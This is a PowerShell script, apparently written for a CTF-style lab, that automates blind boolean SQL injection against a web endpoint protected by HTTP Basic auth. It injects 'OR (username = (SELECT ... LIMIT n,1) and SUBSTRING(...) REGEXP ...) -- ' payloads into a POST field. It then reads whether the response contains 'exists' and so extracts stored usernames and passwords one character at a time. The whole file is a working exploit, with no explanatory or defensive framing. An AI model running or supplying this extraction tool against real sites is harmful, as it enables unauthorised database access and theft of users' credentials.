param (
    [Parameter(Mandatory=$true)]
    [string]$server,
    [Parameter(Mandatory=$true)]
    [string]$username,
    [Parameter(Mandatory=$true)]
    [string]$password
)
$url = $server

$pair = "${username}:${password}"
$bytes = [System.Text.Encoding]::ASCII.GetBytes($pair)
$base64 = [System.Convert]::ToBase64String($bytes)
$authorization = "Basic $base64"

$headers = @{
    "Authorization" = $authorization
    "Content-Type"  = "application/x-www-form-urlencoded"
} 

$POSTData_FieldName = "username=";

$TRUEReturnValue = 'exists';
$ERRORRReturnvalue = 'Error';

function Invoke-PostRequest {
    param (
        [int]$accountIndex,
        [string]$characterIndex,
        [string]$REGEXPSet,
        [string]$TestingChar,
        [string]$fieldName
    )

    #QUERY - EXAMPLE: 'username=" OR SUBSTRING(username, 1, 1) REGEXP "[0-9]" LIMIT 1 -- '
    
    $postData = $POSTData_FieldName + '" OR (username =';
    $postData += " (SELECT username FROM users ORDER BY username, password";
    
    #add limit
    if ($accountIndex -eq 1) {
        $postData += ' LIMIT 1)';
    }
    elseif ($accountIndex -gt 1) {
        $postData += ' LIMIT ' + ($accountIndex - 1) + ', 1)'
    }


    if (!$TestingChar) {
        #check character type
        $postData += ' and BINARY SUBSTRING(' + $fieldName + ', ' + $characterIndex + ', 1) REGEXP BINARY "[' + $REGEXPSet + ']"';
    }
    else {
        #get matching character
        $postData += ' and SUBSTRING(' + $fieldName + ', ' + $characterIndex + ', 1) = "' + $TestingChar + '"';
    }
    $postData += ') -- '

    <#
        SELECT * FROM users WHERE username ="" OR 
        username = (
                        SELECT username FROM users ORDER BY username LIMIT 1
        ) and SUBSTRING(username, 1, 1) REGEXP "[a-z]"
#>
    #REQUEST     
    try {
        $response = Invoke-WebRequest -Uri $url -Method Post -Headers $headers -Body $postData
        
        if ($response) {
            #write-host $response.Content
            if ($response.Content -like "*$TRUEReturnValue*") {
                #Success! Return the matching character.
                if ($TestingChar) {
                    return $TestingChar
                }
                else {
                    return $REGEXPSet
                }
            }
            elseif ($response.Content -like "*$ERRORRReturnvalue*") {
                Write-Host $response
                Write-Host "Error, Abort Abort!!!"
                Exit
            }
            else {
                return ""
            }
        }
        else {
            return ""
        }
    }
    catch {
        Write-Host "Error occurred for characterIndex: $characterIndex, REGEXPSet: $REGEXPSet, char: $TestingChar - $_"
        Write-Host "$postData"
    }
}


function GetCharacterType {
    param (
        [int]$accIndex,
        [int]$characterIndex,
        [string]$fieldName  

    )
    foreach ($REGEXPSet in @("a-z", "A-Z", "0-9")) {
        $invokeResult = Invoke-PostRequest -accountIndex $accIndex -characterIndex $characterIndex -REGEXPSet $REGEXPSet -fieldName $fieldName;
        if ($invokeResult) {
            return $invokeResult
            
        }
    } 
    return ""
}

function GetCharacter {
    param (
        [int]$accIndex,
        [int]$characterIndex,
        [string]$fieldName,
        [string]$REGEXPSet
    )
    $characterResult = "";

    $lowercaseChars = 97..122 | ForEach-Object { [char]$_ }
    $uppercaseChars = 65..90 | ForEach-Object { [char]$_ }
    $numbers = 48..57 | ForEach-Object { [char]$_ }

    #invoke-request get result
    switch -casesensitive ($REGEXPSet) {
        "a-z" {
            foreach ($char in $lowercaseChars) {
                $characterResult = Invoke-PostRequest -accountIndex $accIndex -characterIndex $characterIndex -REGEXPSet $REGEXPSet -TestingChar $char -fieldName $fieldName
                if ($characterResult) {
                    break
                }
            } 
        }
        "A-Z" {
            foreach ($char in $uppercaseChars) {
                $characterResult = Invoke-PostRequest -accountIndex $accIndex -characterIndex $characterIndex -REGEXPSet $REGEXPSet -TestingChar $char -fieldName $fieldName
                if ($characterResult) {
                    break
                }
            }
        }
        "0-9" {
            foreach ($char in $numbers) {
                $characterResult = Invoke-PostRequest -accountIndex $accIndex -characterIndex $characterIndex -REGEXPSet $REGEXPSet -TestingChar $char -fieldName $fieldName
                if ($characterResult) {
                    break
                }
            }
        }
    }
    
    Write-Host "        Field: $characterIndex : GetCharacter  Returned: $characterResult"
    return $characterResult
}

function GetFieldByBlindInjection {
    param (
        [int]$accountIndex,
        [int]$fieldLength,
        [string]$fieldName        
    )
    $fieldResult = "";
    #takes care of $fieldLength
    for ($charIndex = 1; $charIndex -le $fieldLength; $charIndex++) { 

        # To substantially reduce the amount of requests created, we check if the character is lowercase, UPPERCASE, or a Number
        # REGEXP Request: "[a-z]", "[A-Z]", "[0-9]"

        foreach ($REGEXPSet in @("a-z", "A-Z", "0-9")) {
            $charType = GetCharacterType -accIndex $accountIndex -characterIndex $charIndex -fieldName $fieldName;
            #once charType is found, we find the character
            if ($charType) {
                Write-Host ""
                Write-Host "    Field: $charIndex : Get REGEXP Successfull: $charType"
                $characterResult = GetCharacter -accIndex $accountIndex -characterIndex $charIndex -fieldName $fieldName -REGEXPSet $charType;
                $fieldResult += $characterResult;

                break #out of foreach regexpset loop
            }
        }
    }
    return $fieldResult
}


for ($accIndex = 4; $accIndex -le 4; $accIndex++) {

    $characterLength = 0;
    #username lengths
    switch ($accIndex) {
        1 {
            $characterLength = 5
        }
        2 {
            $characterLength = 2
        }
        3 {
            $characterLength = 7
        }
        4 {
            $characterLength = 7
        }
    }

    Write-Host "---------------------------------------------"
    Write-Host "---------------------------------------------"
    Write-Host ""
    Write-Host "Account-Index: $accIndex User-Length: $characterLength"

    #do username
    Write-Host ""

    $usernameResult = GetFieldByBlindInjection -accountIndex $accIndex -fieldLength $characterLength -fieldName "username";
    
    #password lengths
    switch ($accIndex) {
        4 {
            $characterLength = 32
        }
        1 {
            $characterLength = 10
        }
        2 {
            $characterLength = 10
        }
        3 {
            $characterLength = 10
        }
    }
    #do password
    
    Write-Host ""
    Write-Host "Account-Index: $accIndex pwd-Length: $characterLength"
    Write-Host ""

    $pwdResult = GetFieldByBlindInjection -accountIndex $accIndex -fieldLength $characterLength -fieldName "password";
    Write-Host "Account-Index: $accIndex | username: $usernameResult | password: $pwdResult |"

    Write-Host ""
}